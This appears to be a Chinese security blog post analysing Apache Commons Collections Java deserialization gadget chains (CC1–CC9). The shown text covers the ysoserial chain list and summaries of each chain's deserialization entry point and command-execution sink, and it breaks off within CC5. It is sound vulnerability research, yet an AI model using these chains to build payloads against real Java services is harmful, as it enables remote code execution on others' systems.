<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <meta charset="utf-8">
<title>Commons Collections 反序列化利用链分析 - P2hm1n&#39;s Blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">








    <meta name="description" content="&amp;#x672C;&amp;#x7BC7;&amp;#x6587;&amp;#x7AE0;&amp;#x4E3A; Apache Commons Collections &amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;&amp;#x5229;&amp;#x7528;&amp;#x94FE;&amp;#x5206;&amp;#x6790;">
<meta property="og:type" content="article">
<meta property="og:title" content="Commons Collections 反序列化利用链分析">
<meta property="og:url" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="P2hm1n&#39;s Blog">
<meta property="og:description" content="&amp;#x672C;&amp;#x7BC7;&amp;#x6587;&amp;#x7AE0;&amp;#x4E3A; Apache Commons Collections &amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;&amp;#x5229;&amp;#x7528;&amp;#x94FE;&amp;#x5206;&amp;#x6790;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20201229000221187.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210004211853.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210004917701.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209184506179.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209184258134.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209205806502.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209210130168.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209221024520.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209222512595.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210010822748.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210011230727.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210013650091.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210135056946.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210165032955.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210165212176.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210175325623.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210185346055.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210184040076.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211145943465.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213022249941.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133100734.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133539904.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133950227.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212220401768.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212220910736.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212221022010.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212222808177.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212222905993.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213141618580.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213142428801.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213020034643.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213143732101.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211151623182.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211153944181.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211163101314.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211162921710.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211163413684.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211205741258.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211164601311.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215727507.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215810147.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215837664.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211222456810.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211222523482.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212163921869.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212165229612.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212162614324.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212175610563.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212175740438.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212181530639.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183042252.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183017632.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183002189.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212201448996.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212211823221.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212211841160.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152550114.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152630578.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152729420.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152823836.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212210310039.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212213711575.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211174913454.png">
<meta property="og:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211180848445.png">
<meta property="article:published_time" content="2021-02-13T07:27:28.000Z">
<meta property="article:modified_time" content="2021-02-23T09:49:17.108Z">
<meta property="article:author" content="P2hm1n">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20201229000221187.png">





<link rel="icon" href="/favicon.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">


<link rel="stylesheet" href="/css/style.css">


<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>


    
    
    
    
    
    
    
    
    
    

    


<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                <img src="/images/logo.png" alt="" height="50">
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">Archives</a>
            
            <a class="navbar-item "
               href="/categories">Categories</a>
            
            <a class="navbar-item "
               href="/tags">Tags</a>
            
            <a class="navbar-item "
               href="/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="Suche" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Inhaltsverzeichnis">
                    <i class="fa fa-list"></i>
                </a>
                <div class="navbar-dropdown is-right">
                    
                    
                    
                    
                    <a class="navbar-item" href="#Preface">1&nbsp;&nbsp;<b>Preface</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CommonsCollections1">2&nbsp;&nbsp;<b>CommonsCollections1</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Basics">2.1&nbsp;&nbsp;Basics</a>
                    
                    
                    
                    <a class="navbar-item" href="#TransformedMap-Gadget-chain">2.2&nbsp;&nbsp;TransformedMap Gadget chain</a>
                    
                    
                    
                    <a class="navbar-item" href="#LazyMap-Gadget-chain">2.3&nbsp;&nbsp;LazyMap Gadget chain</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CommonsCollections2">3&nbsp;&nbsp;<b>CommonsCollections2</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Basics-1">3.1&nbsp;&nbsp;Basics</a>
                    
                    
                    
                    <a class="navbar-item" href="#Gadget-chain">3.2&nbsp;&nbsp;Gadget chain</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CommonsCollections3">4&nbsp;&nbsp;<b>CommonsCollections3</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Basics-2">4.1&nbsp;&nbsp;Basics</a>
                    
                    
                    
                    <a class="navbar-item" href="#Gadget-chain-1">4.2&nbsp;&nbsp;Gadget chain</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CommonsCollections4">5&nbsp;&nbsp;<b>CommonsCollections4</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Basics-3">5.1&nbsp;&nbsp;Basics</a>
                    
                    
                    
                    <a class="navbar-item" href="#Gadget-chain-2">5.2&nbsp;&nbsp;Gadget chain</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CommonsCollections5">6&nbsp;&nbsp;<b>CommonsCollections5</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Basics-4">6.1&nbsp;&nbsp;Basics</a>
                    
                    
                    
                    <a class="navbar-item" href="#Gadget-chain-3">6.2&nbsp;&nbsp;Gadget chain</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CommonsCollections6">7&nbsp;&nbsp;<b>CommonsCollections6</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Basics-5">7.1&nbsp;&nbsp;Basics</a>
                    
                    
                    
                    <a class="navbar-item" href="#Gadget-chain-4">7.2&nbsp;&nbsp;Gadget chain</a>
                    
                    
                    
                    <a class="navbar-item" href="#Simpler-Gadget-chain">7.3&nbsp;&nbsp;Simpler Gadget chain</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CommonsCollections7">8&nbsp;&nbsp;<b>CommonsCollections7</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Basics-6">8.1&nbsp;&nbsp;Basics</a>
                    
                    
                    
                    <a class="navbar-item" href="#Gadget-chain-5">8.2&nbsp;&nbsp;Gadget chain</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#Commons-Collections-Version">9&nbsp;&nbsp;<b>Commons Collections Version</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Commons-Collections-3-2-2-Fix">9.1&nbsp;&nbsp;Commons Collections 3.2.2 Fix</a>
                    
                    
                    
                    <a class="navbar-item" href="#Commons-Collections-4-1-Fix">9.2&nbsp;&nbsp;Commons Collections 4.1 Fix</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#More-Gadget-Chain">10&nbsp;&nbsp;<b>More Gadget Chain</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#CommonsCollections8">10.1&nbsp;&nbsp;CommonsCollections8</a>
                    
                    
                    
                    <a class="navbar-item" href="#CommonsCollections9">10.2&nbsp;&nbsp;CommonsCollections9</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#END">11&nbsp;&nbsp;<b>END</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" title="GitHub" href="https://github.com/P2hm1n" target="_blank" rel="noopener">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Commons Collections 反序列化利用链分析
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            
                <time datetime="2021-02-13T07:27:28.000Z" itemprop="datePublished">2月 13 2021</time>
            
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Java-Sec/">Java Sec</a>
        </span>
        
        
        <span class="column is-narrow">
            
            
            1 小时 lesen (Über 9900 Wörter)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <html><head></head><body><p>&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x4E3A; Apache Commons Collections &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x5206;&#x6790;</p>
<a id="more"></a>

<p>[TOC]</p>
<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>&#x5728; CommonsCollections &#x751F;&#x6001;&#x4E2D;&#xFF0C;3 &#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#x662F; 3.2.2&#x3002;&#x518D;&#x6B21;&#x57FA;&#x7840;&#x4E0A;&#x5F88;&#x591A;&#x5229;&#x7528;&#x94FE;&#x90FD;&#x5931;&#x6548;&#x4E86;&#x3002;&#x4E0B;&#x56FE; JDK &#x7248;&#x672C;&#x53EA;&#x662F;&#x5927;&#x7248;&#x672C;&#x666E;&#x904D;&#x9002;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x4E0D;&#x4EE3;&#x8868;&#x7EC6;&#x81F4;&#x7684;&#x5229;&#x7528;&#x7248;&#x672C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20201229000221187.png" alt></p>
<p>ysoserial info</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">CommonsCollections1 @frohoff                               commons-collections:3.1</span><br><span class="line">CommonsCollections2 @frohoff                               commons-collections4:4.0</span><br><span class="line">CommonsCollections3 @frohoff                               commons-collections:3.1</span><br><span class="line">CommonsCollections4 @frohoff                               commons-collections4:4.0</span><br><span class="line">CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1</span><br><span class="line">CommonsCollections6 @matthias_kaiser                       commons-collections:3.1</span><br><span class="line">CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br></pre></td></tr></tbody></table></figure><p></p>
<ul>
<li>CommonsCollections1<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>AnnotationInvocationHandler</code></li>
<li>&#x89C1;&#x524D;&#x6587;</li>
</ul>
</li>
<li>CommonsCollections2<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>PriorityQueue</code></li>
<li><code>PriorityQueue.readObject()</code>&#x6267;&#x884C;&#x6392;&#x5E8F;&#x65F6;&#xFF0C;<code>TransformingComparator.compare()</code>&#x4F1A;&#x8C03;&#x7528;<code>InvokerTransformer.transform()</code>&#x8F6C;&#x6362;&#x5143;&#x7D20;&#xFF0C;&#x8FDB;&#x800C;&#x83B7;&#x53D6;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;<code>TemplatesImpl</code>&#x7684;<code>newTransformer()</code>&#x5E76;&#x8C03;&#x7528;&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
<li>CommonsCollections3<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>AnnotationInvocationHandler</code></li>
<li>&#x9664;<code>Transformer</code>&#x6570;&#x7EC4;&#x5143;&#x7D20;&#x7EC4;&#x6210;&#x4E0D;&#x540C;&#x5916;&#xFF0C;&#x4E0E;CommonsCollections1&#x57FA;&#x672C;&#x4E00;&#x81F4;</li>
</ul>
</li>
<li>CommonsCollections4<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>PriorityQueue</code></li>
<li><code>PriorityQueue.readObject()</code>&#x6267;&#x884C;&#x6392;&#x5E8F;&#x65F6;&#xFF0C;<code>TransformingComparator.compare()</code>&#x4F1A;&#x8C03;&#x7528;<code>ChainedTransformer.transform()</code>&#x8F6C;&#x6362;&#x5143;&#x7D20;&#xFF0C;&#x8FDB;&#x800C;&#x904D;&#x5386;&#x6267;&#x884C;<code>Transformer</code>&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
<li>CommonsCollections5<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>BadAttributeValueExpException</code></li>
